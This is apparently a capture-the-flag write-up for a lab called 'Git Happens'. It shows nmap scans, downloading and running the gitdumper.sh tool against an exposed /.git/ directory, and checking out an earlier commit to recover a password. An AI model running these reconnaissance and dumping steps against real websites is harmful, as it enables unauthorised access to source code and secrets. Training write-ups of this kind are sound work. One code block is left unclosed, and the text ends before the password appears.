# Git Happens | Easy

## Overview

Boss wanted me to create a prototype, so here it is! We even used something called "version control" that made deploying this really easy!

## Walkthrough

Scanning all ports only shows port 80 is open (HTTP):

```console
$ nmap -p- -T4 VICTIM_IP -oN scans/initial.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 16:21 GMT
Nmap scan report for VICTIM_IP
Host is up (0.040s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 30.38 seconds
```

Running a full scan against this port confirms it is running Ubuntu with version `1.14.0` of Nginx and finds a Git repository at `/.git/`.

```console
$ nmap -p 80 -A -T4 VICTIM_IP -oN scans/openports.nmap   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 16:22 GMT
Nmap scan report for VICTIM_IP
Host is up (0.032s latency).

Navigating to the website shows a login form:

From our Nmap scan, recall that there is a `/.git/` directory which holds the structure of a GitHub repository:

![GitHappens - .git directory](/images/githappens_git_directory.png)

We can use [gitdumper.sh](https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh) from [GitTools](https://github.com/internetwache/GitTools) to dump the Git repository from the site:

```console
$ wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh
$ chmod +x gitdumper.sh
$ ./gitdumper.sh http://VICTIM_IP/.git/ .
```

We now have a `.git/` folder downloaded to our attacker machine. With this, we can run `git log` to show the commit logs. From the log, we can see a security change was made to obfuscate the code at commit `e56eaa8e29b589976f33d76bc58a0c4dfb9315b1`.

```console
$ git log
```

As such, we can run `git checkout` to load the previous commit `395e087334d613d5e423cdf8f7be27196a360459` and view the deobfuscated code.

```console
$ git checkout 395e087334d613d5e423cdf8f7be27196a360459
```

We can view the `index.html` file to view the **Super Secret Password**:
